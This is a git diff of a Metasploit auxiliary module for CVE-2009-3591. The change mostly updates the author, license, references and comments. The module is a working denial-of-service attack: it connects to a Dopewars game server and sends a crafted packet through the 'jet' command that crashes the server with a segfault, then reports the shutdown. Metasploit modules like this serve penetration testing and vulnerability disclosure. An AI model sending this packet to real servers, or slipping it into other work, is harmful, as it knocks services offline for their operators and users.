@@ -1,9 +1,14 @@
-# Dopewars DOS attack.
+# Dopewars DOS attack
+#
+# The Jet command is susceptible to a segfault.
+# This will crash the server but does not seem to be
+# exploitable any further. 
+# This has been fixed in the SVN version.
+#
 
 require 'msf/core'
 
-
-class Metasploit3 < Msf::Auxiliary
+class Metasploit4 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Tcp
 	include Msf::Auxiliary::Dos
@@ -15,13 +20,13 @@ class Metasploit3 < Msf::Auxiliary
 				This module sends a specially-crafted packet to a Dopewars 
 				server, causing a SEGFAULT.
 			},
-			'Author'         => [ 'dougsko' ],
-			'License'        => GPL_LICENSE,
-			'Version'        => '0.1.0',
+			'Author'         => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '0.0.1',
 			'References'     =>
 				[
-					[ 'URL', 'None' ],
-					[ 'BID', 'None' ],
+					[ 'URL', 'http://www.securityfocus.com/archive/1/archive/1/507012/100/0/threaded' ],
+					[ 'BID', '36606' ],
 					[ 'CVE', 'CVE-2009-3591' ],
 				]))
 			
@@ -31,13 +36,13 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		connect
 
-        # jet command
+        # The jet command is vulnerable.
         # Program received signal SIGSEGV, Segmentation fault.
         # [Switching to Thread 0xb74916c0 (LWP 30638)]
         # 0x08062f6e in HandleServerMessage (buf=0x8098828 "", Play=0x809a000) at
         # serverside.c:525
         # 525           dopelog(4, LF_SERVER, "%s jets to %s",
-
+        #
 		pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
 		print_status("Sending dos packet...")
 		sock.put(pkt)
@@ -53,5 +58,4 @@ class Metasploit3 < Msf::Auxiliary
             print_status("Dopewars server succesfully shut down!")
         end
 	end
-
 end
